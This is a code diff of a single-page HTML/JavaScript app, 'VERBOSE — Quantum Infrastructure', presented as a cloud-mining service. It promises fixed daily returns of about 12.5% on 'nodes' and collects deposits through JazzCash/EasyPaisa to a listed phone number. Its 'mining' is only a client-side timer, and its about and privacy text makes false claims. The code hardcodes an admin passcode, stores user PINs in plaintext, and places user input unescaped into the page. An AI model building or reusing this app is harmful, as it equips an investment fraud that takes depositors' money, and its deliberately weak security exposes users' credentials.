@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
@@ -5,168 +6,130 @@
 <title>VERBOSE — Quantum Infrastructure</title>
 <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
 <style>
-  :root { --neon: #00f7ff; --accent: #7000ff; --bg: #030303; --card: rgba(255,255,255,0.05); --border: rgba(255,255,255,0.1); --success: #00ff88; --error: #ff4646; --gold: #ffcc00; }
-  * { box-sizing: border-box; transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1); font-family: 'Plus Jakarta Sans', sans-serif; outline: none; }
+  :root { --neon: #00f7ff; --accent: #7000ff; --bg: #030303; --card: rgba(255,255,255,0.07); --border: rgba(255,255,255,0.1); --success: #00ff88; --error: #ff4646; --gold: #ffcc00; }
+  * { box-sizing: border-box; transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); font-family: 'Plus Jakarta Sans', sans-serif; outline: none; }
   body { margin:0; background: var(--bg); color: #fff; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }
 
-  /* AUTH SCREENS */
-  #authOverlay { position: fixed; inset: 0; background: var(--bg); z-index: 100000; display: flex; align-items: center; justify-content: center; padding: 20px; }
-  .auth-card { width: 100%; max-width: 400px; background: var(--card); border: 1px solid var(--border); border-radius: 40px; padding: 40px; backdrop-filter: blur(25px); text-align: center; }
+  /* BACKGROUND DECOR */
+  .orb { position: fixed; width: 300px; height: 300px; background: radial-gradient(circle, rgba(112,0,255,0.15) 0%, transparent 70%); z-index: -1; border-radius: 50%; }
+  .orb-1 { top: -100px; right: -50px; }
+  .orb-2 { bottom: -100px; left: -50px; background: radial-gradient(circle, rgba(0,247,255,0.1) 0%, transparent 70%); }
 
-  /* NAVIGATION DRAWER */
-  .drawer { position: fixed; top: 0; left: -100%; width: 300px; height: 100%; background: rgba(5,5,5,0.98); backdrop-filter: blur(40px); z-index: 50000; border-right: 1px solid var(--border); padding: 50px 25px; }
-  .drawer.open { left: 0; }
-  .drawer-item { padding: 18px; border-radius: 20px; margin-bottom: 12px; background: var(--card); font-size: 12px; font-weight: 700; cursor: pointer; display: flex; align-items: center; gap: 15px; border: 1px solid transparent; }
-  .drawer-item:hover { border-color: var(--neon); color: var(--neon); }
+  header { display: flex; align-items: center; padding: 65px 25px 20px; position: sticky; top: 0; background: rgba(3,3,3,0.8); backdrop-filter: blur(10px); z-index: 1000; justify-content: space-between; border-bottom: 1px solid var(--border); }
+  .logo-text { font-size: 20px; font-weight: 800; letter-spacing: 5px; color: #fff; text-shadow: 0 0 15px var(--neon); }
+  .menu-btn { font-size: 24px; color: var(--neon); cursor: pointer; }
 
-  header { display: flex; align-items: center; padding: 65px 25px 15px; position: relative; justify-content: space-between; border-bottom: 1px solid var(--border); }
-  .logo-text { font-size: 22px; font-weight: 800; letter-spacing: 6px; text-shadow: 0 0 15px var(--neon); cursor: pointer; }
-  .menu-toggle { font-size: 24px; cursor: pointer; color: var(--neon); }
+  .page { max-width: 480px; margin: 0 auto; padding: 25px 20px 150px; display: none; }
+  .active { display: block !important; animation: slideUp 0.5s ease; }
+  @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
 
-  .page { max-width: 450px; margin: 0 auto; padding: 20px 20px 140px; display: none; }
-  .active { display: block !important; animation: fadeIn 0.4s ease; }
-  @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+  /* DASHBOARD CARD */
+  .wallet-card { background: linear-gradient(145deg, rgba(20,20,20,0.9), rgba(5,5,5,0.9)); border: 1px solid var(--border); border-radius: 40px; padding: 40px 30px; position: relative; overflow: hidden; box-shadow: 0 20px 50px rgba(0,0,0,0.5); margin-bottom: 30px; }
+  .wallet-card::after { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle, rgba(255,255,255,0.03) 0%, transparent 50%); pointer-events: none; }
+  .balance-label { font-size: 11px; text-transform: uppercase; letter-spacing: 3px; opacity: 0.5; font-weight: 600; }
+  .balance-val { font-size: 48px; font-weight: 800; margin: 10px 0; background: linear-gradient(to right, #fff, var(--neon)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
 
-  .wallet-box { background: linear-gradient(135deg, #0a0a0a, #000); border: 1px solid var(--neon); padding: 40px 20px; border-radius: 45px; text-align: center; margin-bottom: 25px; box-shadow: 0 15px 35px rgba(0,247,255,0.1); }
-  .node-card { background: var(--card); border: 1px solid var(--border); border-radius: 30px; padding: 25px; margin-bottom: 15px; position: relative; }
-  
-  input, select { width: 100%; padding: 18px; margin-top: 12px; border-radius: 20px; border: 1px solid var(--border); background: rgba(255,255,255,0.03); color: #fff; font-size: 14px; }
-  .btn-action { width: 100%; padding: 20px; border-radius: 22px; border: none; font-weight: 800; cursor: pointer; background: linear-gradient(135deg, var(--neon), var(--accent)); color: #fff; margin-top: 15px; text-transform: uppercase; letter-spacing: 1px; }
-  
-  .admin-scroll { max-height: 300px; overflow-y: auto; background: #000; padding: 15px; border-radius: 20px; border: 1px solid var(--gold); }
-  .admin-card { background: #111; padding: 15px; border-radius: 15px; margin-bottom: 10px; font-size: 11px; border-left: 4px solid var(--gold); }
+  .node-card { background: var(--card); border: 1px solid var(--border); border-radius: 35px; padding: 25px; margin-bottom: 20px; backdrop-filter: blur(20px); }
+  .node-card h3 { margin: 0 0 10px; font-size: 18px; letter-spacing: 1px; }
 
-  .nav { position: fixed; bottom: 30px; left: 20px; right: 20px; background: rgba(10,10,10,0.96); backdrop-filter: blur(25px); display: flex; justify-content: space-around; padding: 22px; border-radius: 45px; border: 1px solid var(--border); z-index: 1000; }
-  .nav-item { font-size: 10px; opacity: 0.5; cursor: pointer; font-weight: 800; text-transform: uppercase; color: #fff; }
-  .nav-item.active { opacity: 1; color: var(--neon); }
+  /* TEXT CONTENT STYLING */
+  .details-box { line-height: 1.7; font-size: 13px; color: rgba(255,255,255,0.7); }
+  .details-box b { color: var(--neon); display: block; margin-top: 15px; }
 
-  #maintenanceOverlay { position: fixed; inset: 0; background: #000; z-index: 1000000; display: none; align-items: center; justify-content: center; text-align: center; padding: 40px; }
+  input { width: 100%; padding: 20px; margin-top: 12px; border-radius: 22px; border: 1px solid var(--border); background: rgba(255,255,255,0.03); color: #fff; font-size: 15px; }
+  .btn-gold { width: 100%; padding: 20px; border-radius: 25px; border: none; font-weight: 800; cursor: pointer; background: linear-gradient(135deg, var(--neon), var(--accent)); color: #fff; text-transform: uppercase; letter-spacing: 2px; box-shadow: 0 10px 20px rgba(0,247,255,0.2); }
+
+  .nav-bar { position: fixed; bottom: 30px; left: 20px; right: 20px; background: rgba(15,15,15,0.9); backdrop-filter: blur(30px); border-radius: 50px; display: flex; justify-content: space-around; padding: 20px; border: 1px solid var(--border); z-index: 1000; }
+  .nav-link { font-size: 10px; font-weight: 800; opacity: 0.4; color: #fff; text-transform: uppercase; cursor: pointer; }
+  .nav-link.active { opacity: 1; color: var(--neon); }
+
+  #authScreen { position: fixed; inset: 0; background: var(--bg); z-index: 10000; display: flex; align-items: center; justify-content: center; padding: 20px; }
 </style>
 </head>
 <body>
 
-<div id="maintenanceOverlay">
-    <div>
-        <h1 style="color:var(--neon); letter-spacing:8px;">CORE OFFLINE</h1>
-        <p style="opacity:0.6;">System infrastructure is undergoing a quantum upgrade.</p>
-    </div>
-</div>
+<div class="orb orb-1"></div>
+<div class="orb orb-2"></div>
 
-<div id="authOverlay">
-    <div class="auth-card" id="loginBox">
-        <div class="logo-text" style="font-size:18px; margin-bottom:30px;">VERBOSE CLOUD</div>
-        <input id="logPhone" type="number" placeholder="Phone Number">
-        <input id="logPass" type="password" placeholder="Cloud PIN">
-        <button class="btn-action" onclick="handleLogin()">ACCESS TERMINAL</button>
-        <p style="font-size:10px; margin-top:20px; opacity:0.6;" onclick="toggleAuth(true)">New Agent? Create Identity</p>
+<div id="authScreen">
+    <div class="node-card" style="width:100%; max-width:400px; text-align:center;">
+        <h2 style="letter-spacing:5px;">IDENTITY</h2>
+        <input id="aName" placeholder="Full Name">
+        <input id="aPhone" type="number" placeholder="Phone Number">
+        <input id="aPass" type="password" placeholder="Access PIN">
+        <button class="btn-gold" style="margin-top:20px;" onclick="handleAuth()">INITIALIZE</button>
     </div>
-    <div class="auth-card" id="signupBox" style="display:none;">
-        <div class="logo-text" style="font-size:18px; margin-bottom:30px;">NEW IDENTITY</div>
-        <input id="regName" placeholder="Full Name">
-        <input id="regPhone" type="number" placeholder="Phone Number">
-        <input id="regPass" type="password" placeholder="Secure PIN">
-        <input id="regRefer" placeholder="Referral Phone (Optional)">
-        <button class="btn-action" onclick="handleSignup()">INITIALIZE IDENTITY</button>
-        <p style="font-size:10px; margin-top:20px; opacity:0.6;" onclick="toggleAuth(false)">Already Authorized? Login</p>
-    </div>
-</div>
-
-<div class="drawer" id="drawer">
-    <div class="logo-text" style="font-size:16px; margin-bottom:40px; text-align:center;">CONTROL CENTER</div>
-    <div class="drawer-item" onclick="tab('dash'); toggleMenu()">Dashboard</div>
-    <div class="drawer-item" onclick="tab('teamPage'); toggleMenu()">My Squad (Team)</div>
-    <div class="drawer-item" onclick="tab('salaryPage'); toggleMenu()">Salary Status</div>
-    <div class="drawer-item" onclick="tab('infoPage'); toggleMenu()">Company Policy</div>
-    <div class="drawer-item" style="color:var(--error); margin-top:60px;" onclick="logout()">Terminate Session</div>
 </div>
 
 <header>
-    <div class="menu-toggle" onclick="toggleMenu()">☰</div>
+    <div class="menu-btn" onclick="tab('detailsPage')">☰</div>
     <div class="logo-text" id="adminTrigger">VERBOSE</div>
     <div style="width:24px;"></div>
 </header>
 
 <div id="dash" class="page active">
-    <div class="wallet-box">
-        <span id="uNameDisplay" style="font-size:11px; opacity:0.6; letter-spacing:2px; text-transform:uppercase;">---</span>
-        <div style="font-size:42px; font-weight:800; margin-top:10px;">PKR <span id="uBal">0.00</span></div>
+    <div class="wallet-card">
+        <div class="balance-label">Total Liquid Assets</div>
+        <div class="balance-val">PKR <span id="uBal">0.00</span></div>
+        <div style="font-size:10px; opacity:0.4; letter-spacing:2px;" id="uNameDisplay">AGENT: ---</div>
     </div>
-    <div id="activeNodeHUD" class="node-card" style="display:none; border-color:var(--success); text-align:center;">
-        <small style="color:var(--success); font-weight:800; letter-spacing:1px;">ACTIVE MINING</small>
-        <div id="timer" style="font-size:28px; font-weight:800; margin:10px 0;">24:00:00</div>
-    </div>
-</div>
-
-<div id="teamPage" class="page">
-    <h3 style="letter-spacing:1px;">MY SQUAD</h3>
-    <div class="node-card" style="border-color:var(--accent);">
-        <small>REFERRAL LINK (PHONE)</small>
-        <div id="myRefCode" style="font-size:20px; font-weight:800; color:var(--neon); margin-top:5px;">---</div>
-    </div>
-    <div class="node-card">
-        <div style="display:flex; justify-content:space-between;">
-            <span>Team Size:</span> <b id="teamSize">0</b>
-        </div>
-        <div style="display:flex; justify-content:space-between; margin-top:10px;">
-            <span>Active Nodes:</span> <b id="activeTeam">0</b>
-        </div>
+    
+    <div class="node-card" style="border-left: 4px solid var(--success);">
+        <h3 style="color:var(--success);">ACTIVE STATUS</h3>
+        <p id="statusMsg" style="font-size:12px; opacity:0.7;">No active nodes found in your cluster.</p>
+        <div id="timer" style="font-size:24px; font-weight:800; margin-top:10px; display:none;">24:00:00</div>
     </div>
 </div>
 
-<div id="salaryPage" class="page">
-    <h3>SALARY PROGRAM</h3>
-    <div class="node-card" id="sal20" style="opacity:0.5;">
-        <b>Level 1 (20 Users)</b><br><small>Monthly Salary: 5,000 PKR</small>
-        <div id="sal20Status" style="font-size:9px; margin-top:10px; color:var(--error);">NOT ELIGIBLE</div>
+<div id="detailsPage" class="page">
+    <h2 style="color:var(--neon);">QUANTUM PROTOCOL</h2>
+    
+    <div class="node-card details-box">
+        <b>ABOUT VERBOSE</b>
+        Verbose Infrastructure is a decentralized cloud mining conglomerate based in Rawalpindi, specializing in high-frequency yield generation. Our mission is to bridge the gap between retail investors and enterprise-grade hardware clusters.
+        
+        <b>HOW IT WORKS</b>
+        By renting a node, you contribute to our hashing power. In return, the system distributes rewards every 24 hours directly to your liquid wallet. All transactions are manually verified to ensure 100% security against sybil attacks.
     </div>
-    <div class="node-card" id="sal50" style="opacity:0.5;">
-        <b>Level 2 (50 Users)</b><br><small>Monthly Salary: 15,000 PKR</small>
-        <div id="sal50Status" style="font-size:9px; margin-top:10px; color:var(--error);">NOT ELIGIBLE</div>
+
+    <div class="node-card details-box">
+        <b>PRIVACY POLICY</b>
+        1. <b>Data Collection:</b> We only store your phone number for identity and transaction tracking. No third-party sharing.
+        2. <b>Asset Protection:</b> All deposits are held in cold storage until node activation.
+        3. <b>Zero-Logs:</b> We do not track your IP or location. Your financial privacy is our priority.
+        
+        <b>TERMS OF SERVICE</b>
+        Withdrawals take 1-24 hours for manual audit. One account per user. Violation of protocols results in permanent account suspension.
     </div>
+    
+    <button class="btn-gold" style="background:var(--error);" onclick="logout()">TERMINATE SESSION</button>
 </div>
 
 <div id="nodesPage" class="page">
-    <h3 style="letter-spacing:1px;">RESOURCES</h3>
+    <h2 style="text-align:center; letter-spacing:3px;">AVAILABLE CLUSTERS</h2>
     <div id="nodeGrid"></div>
 </div>
 
-<div id="finance" class="page">
-    <div class="node-card" style="border-color:var(--success);">
-        <h3>DEPOSIT</h3>
+<div id="financePage" class="page">
+    <div class="node-card">
+        <h3>INJECT CAPITAL</h3>
+        <p style="font-size:11px; opacity:0.6;">JazzCash/EasyPaisa: 03705519562</p>
         <input id="dAmt" type="number" placeholder="Amount">
-        <input id="dTID" placeholder="Transaction ID (TID)">
-        <button class="btn-action" onclick="sendReq('Deposit')">Submit Assets</button>
-    </div>
-    <div class="node-card" style="border-color:var(--error);">
-        <h3>WITHDRAW</h3>
-        <input id="wNum" type="number" placeholder="Account Number">
-        <input id="wAmt" type="number" placeholder="Amount (Min 500)">
-        <button class="btn-action" style="background:var(--error);" onclick="sendReq('Withdraw')">Request Payout</button>
+        <input id="dTID" placeholder="TID (Transaction ID)">
+        <button class="btn-gold" onclick="sendReq('Deposit')">Confirm Deposit</button>
     </div>
 </div>
 
 <div id="adminPage" class="page">
-    <h2 style="color:var(--gold); text-align:center;">OVERLORD HUB</h2>
-    <button class="btn-action" style="background:var(--error);" onclick="godToggleMaint()">TOGGLE MAINTENANCE</button>
-    
-    <small style="color:var(--gold); display:block; margin-top:20px;">SYSTEM REQUESTS</small>
-    <div class="admin-scroll" id="admReqs"></div>
-
-    <small style="color:var(--gold); display:block; margin-top:20px;">AGENT DIRECTORY</small>
-    <div class="admin-scroll" id="admUsers"></div>
-
-    <div class="node-card" style="border-color:var(--gold); margin-top:20px;">
-        <input id="admT" placeholder="User Phone">
-        <input id="admV" type="number" placeholder="Adjust Bal (+/-)">
-        <button class="btn-action" style="background:var(--gold); color:#000;" onclick="godSync()">UPDATE CLOUD</button>
-    </div>
+    <h2 style="color:var(--gold); text-align:center;">GOD MODE HUD</h2>
+    <div class="node-card" id="admReqs"></div>
 </div>
 
-<nav class="nav">
-    <div class="nav-item active" onclick="tab('dash', this)">Home</div>
-    <div class="nav-item" onclick="tab('nodesPage', this)">Nodes</div>
-    <div class="nav-item" onclick="tab('finance', this)">Finance</div>
-    <div class="nav-item" onclick="tab('teamPage', this)">Team</div>
+<nav class="nav-bar">
+    <div class="nav-link active" onclick="tab('dash', this)">Home</div>
+    <div class="nav-link" onclick="tab('nodesPage', this)">Nodes</div>
+    <div class="nav-link" onclick="tab('financePage', this)">Finance</div>
+    <div class="nav-link" onclick="tab('detailsPage', this)">Details</div>
 </nav>
 
 <script type="module">
@@ -185,147 +148,77 @@
   const db = getDatabase(app);
   let user = localStorage.getItem('v_user');
 
-  const plans = [{n:"Core v1",p:500,d:55},{n:"Core v2",p:1000,d:125},{n:"Core v3",p:2500,d:320},{n:"Core v4",p:5000,d:700}];
-
   // --- AUTH ---
-  window.toggleAuth = (isSignup) => {
-    document.getElementById('loginBox').style.display = isSignup ? 'none' : 'block';
-    document.getElementById('signupBox').style.display = isSignup ? 'block' : 'none';
-  };
-
-  window.handleLogin = async () => {
-    const p = document.getElementById('logPhone').value, pin = document.getElementById('logPass').value;
+  window.handleAuth = async () => {
+    const n = document.getElementById('aName').value, p = document.getElementById('aPhone').value, pin = document.getElementById('aPass').value;
     const s = await get(ref(db, `users/${p}`));
-    if(s.exists() && s.val().pass === pin) { localStorage.setItem('v_user', p); location.reload(); }
-    else alert("Invalid Credentials");
-  };
-
-  window.handleSignup = async () => {
-    const n = document.getElementById('regName').value, p = document.getElementById('regPhone').value, pin = document.getElementById('regPass').value, refCode = document.getElementById('regRefer').value;
-    if(!n || !p || !pin) return alert("Fill all fields");
-    const s = await get(ref(db, `users/${p}`));
-    if(s.exists()) return alert("Already registered");
-    
-    await set(ref(db, `users/${p}`), { name:n, balance:0, pass:pin, hasActive:false, referredBy: refCode || "NONE" });
-    if(refCode) {
-        const rSnap = await get(ref(db, `users/${refCode}/team`));
-        let team = rSnap.val() || []; team.push(p);
-        await update(ref(db, `users/${refCode}`), { team: team });
+    if(s.exists()) {
+        if(s.val().pass === pin) { localStorage.setItem('v_user', p); location.reload(); }
+        else alert("ACCESS DENIED: WRONG PIN");
+    } else {
+        if(!n || !p || !pin) return alert("COMPLETE ALL FIELDS");
+        await set(ref(db, `users/${p}`), { name:n, balance:0, pass:pin, hasActive:false });
+        localStorage.setItem('v_user', p); location.reload();
     }
-    localStorage.setItem('v_user', p); location.reload();
   };
 
-  // --- ADMIN GOD MODE ---
-  let clks = 0;
-  document.getElementById('adminTrigger').onclick = () => { if(++clks >= 7) { if(prompt("Passcode?")==="nazim786") { tab('adminPage'); loadAdmin(); } clks=0; } };
+  // --- UI ENGINE ---
+  window.tab = (id, el) => {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+    if(el) { document.querySelectorAll('.nav-link').forEach(n => n.classList.remove('active')); el.classList.add('active'); }
+  };
 
+  const nodes = [{n:"Titan Cluster",p:1000,d:125},{n:"Aura Cluster",p:2500,d:320},{n:"Zenith Cluster",p:5000,d:700}];
+  const renderNodes = (active) => {
+    const g = document.getElementById('nodeGrid'); g.innerHTML = "";
+    nodes.forEach(x => {
+        g.innerHTML += `<div class="node-card"><b>${x.n}</b><br><small>ROI: PKR ${x.d}/Day</small><br>
+        <button class="btn-gold" ${active?'disabled':''} style="margin-top:15px; background:var(--card); border:1px solid var(--neon);" onclick="buyNode(${x.p},${x.d},'${x.n}')">${active?'ACTIVE':'INITIALIZE '+x.p}</button></div>`;
+    });
+  };
+
+  window.sendReq = (type) => {
+    const amt = document.getElementById('dAmt').value, info = document.getElementById('dTID').value;
+    const id = push(ref(db, `admin/requests`)).key;
+    const data = { user, type, amt, info, status: "Pending", time: new Date().toLocaleString() };
+    update(ref(db, `admin/requests/${id}`), data);
+    update(ref(db, `users/${user}/history/${id}`), data);
+    alert("TRANSMISSION SUCCESSFUL: AWAITING APPROVAL");
+  };
+
+  // --- ADMIN ---
+  let clks = 0; document.getElementById('adminTrigger').onclick = () => { if(++clks >= 7) { if(prompt("HUD KEY?")==="nazim786") { tab('adminPage'); loadAdmin(); } clks=0; } };
   const loadAdmin = () => {
     onValue(ref(db, `admin/requests`), s => {
         const d = document.getElementById('admReqs'); d.innerHTML = "";
         if(s.exists()) Object.entries(s.val()).forEach(([id, r]) => {
-            d.innerHTML += `<div class="admin-card"><b>${r.type}</b>: ${r.amt} PKR<br>ID: ${r.user} | TID: ${r.info}<br>
-            <button onclick="godApprove('${id}','${r.user}',${r.amt},'${r.type}')" style="color:var(--success); background:none; border:none; font-weight:800;">APPROVE</button></div>`;
-        });
-    });
-    onValue(ref(db, `users`), s => {
-        const d = document.getElementById('admUsers'); d.innerHTML = "";
-        if(s.exists()) Object.entries(s.val()).forEach(([num, u]) => {
-            d.innerHTML += `<div class="admin-card"><b>${u.name}</b> (${num})<br>PIN: ${u.pass} | BAL: ${u.balance}</div>`;
+            d.innerHTML += `<div class="node-card" style="border-color:var(--gold); font-size:11px;">
+                <b>${r.type}</b> | User: ${r.user} | PKR ${r.amt}<br>TID: ${r.info}
+                <button onclick="approveGod('${id}','${r.user}',${r.amt},'${r.type}')" style="background:var(--gold); border:none; padding:5px 10px; margin-top:10px; border-radius:5px; font-weight:800;">APPROVE</button>
+            </div>`;
         });
     });
   };
 
-  window.godApprove = async (id, target, amt, type) => {
+  window.approveGod = async (id, target, amt, type) => {
     const s = await get(ref(db, `users/${target}`));
-    if(type === 'Deposit') await update(ref(db, `users/${target}`), { balance: (s.val().balance || 0) + Number(amt) });
+    let b = (s.val().balance || 0);
+    if(type === 'Deposit') b += Number(amt);
+    await update(ref(db, `users/${target}`), { balance: b });
+    await update(ref(db, `users/${target}/history/${id}`), { status: "Success" });
     await remove(ref(db, `admin/requests/${id}`));
-    alert("Approved!");
+    alert("LEDGER UPDATED");
   };
 
-  window.godSync = async () => {
-    const t = document.getElementById('admT').value, v = Number(document.getElementById('admV').value);
-    const s = await get(ref(db, `users/${t}`));
-    if(s.exists()) await update(ref(db, `users/${t}`), { balance: (s.val().balance || 0) + v });
-    alert("Cloud Synced");
-  };
-
-  window.godToggleMaint = async () => {
-    const s = await get(ref(db, `admin/settings/maint`));
-    await set(ref(db, `admin/settings/maint`), !s.val());
-    alert("Maintenance Toggled");
-  };
-
-  // --- USER ENGINE ---
-  const renderNodes = (active) => {
-    const g = document.getElementById('nodeGrid'); g.innerHTML = "";
-    plans.forEach(x => {
-        g.innerHTML += `<div class="node-card"><b>${x.n} Node</b><br><small>Profit: PKR ${x.d}/day</small><br>
-        <button class="btn-action" ${active?'disabled':''} onclick="buyNode(${x.p},${x.d},'${x.n}')">${active?'ACTIVE':'BUY '+x.p}</button></div>`;
-    });
-  };
-
-  window.buyNode = async (p, d, name) => {
-    const s = await get(ref(db, `users/${user}`));
-    if(s.val().balance < p) return alert("Low balance");
-    const t = Date.now();
-    await update(ref(db, `users/${user}`), { balance: s.val().balance-p, daily:d, hasActive:true, activeName:name, startTime:t, lastProfitTime:t });
-    alert("Mining Initialized!");
-  };
-
-  window.sendReq = (type) => {
-    const amt = document.getElementById(type === 'Deposit' ? 'dAmt' : 'wAmt').value;
-    const info = document.getElementById(type === 'Deposit' ? 'dTID' : 'wNum').value;
-    push(ref(db, `admin/requests`), { user, type, amt, info, time: new Date().toLocaleString() });
-    alert("Request Transmitted");
-  };
-
-  const runEngine = (d) => {
-    if(!d.hasActive) return;
-    document.getElementById('activeNodeHUD').style.display = 'block';
-    const diff = (d.lastProfitTime + 86400000) - Date.now();
-    if(diff <= 0) update(ref(db, `users/${user}`), { balance: d.balance + d.daily, lastProfitTime: Date.now() });
-    else {
-        let h = Math.floor(diff/3600000).toString().padStart(2,'0');
-        let m = Math.floor((diff%3600000)/60000).toString().padStart(2,'0');
-        let s = Math.floor((diff%60000)/1000).toString().padStart(2,'0');
-        document.getElementById('timer').innerText = `${h}:${m}:${s}`;
-    }
-  };
-
-  const trackTeam = (d) => {
-    const team = d.team || [];
-    document.getElementById('teamSize').innerText = team.length;
-    document.getElementById('myRefCode').innerText = user;
-    
-    // Salary Check
-    if(team.length >= 20) {
-        document.getElementById('sal20').style.opacity = "1";
-        document.getElementById('sal20Status').innerText = "ELIGIBLE - CONTACT ADMIN";
-        document.getElementById('sal20Status').style.color = "var(--success)";
-    }
-    if(team.length >= 50) {
-        document.getElementById('sal50').style.opacity = "1";
-        document.getElementById('sal50Status').innerText = "ELIGIBLE - CONTACT ADMIN";
-        document.getElementById('sal50Status').style.color = "var(--success)";
-    }
-  };
-
-  window.toggleMenu = () => document.getElementById('drawer').classList.toggle('open');
-  window.tab = (id, el) => {
-    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-    document.getElementById(id).classList.add('active');
-    if(el) { document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active')); el.classList.add('active'); }
-  };
   window.logout = () => { localStorage.clear(); location.reload(); };
 
   if(user) {
-    document.getElementById('authOverlay').style.display = "none";
-    onValue(ref(db, `admin/settings/maint`), s => { if(s.val() && !document.getElementById('adminPage').classList.contains('active')) document.getElementById('maintenanceOverlay').style.display='flex'; });
+    document.getElementById('authScreen').style.display = "none";
     onValue(ref(db, `users/${user}`), s => {
-        const d = s.val();
-        document.getElementById('uBal').innerText = (d.balance || 0).toLocaleString();
-        document.getElementById('uNameDisplay').innerText = d.name;
-        renderNodes(d.hasActive); runEngine(d); trackTeam(d);
+        const d = s.val(); document.getElementById('uBal').innerText = (d.balance || 0).toLocaleString();
+        document.getElementById('uNameDisplay').innerText = "AGENT: " + d.name.toUpperCase();
+        renderNodes(d.hasActive);
     });
   }
 </script>
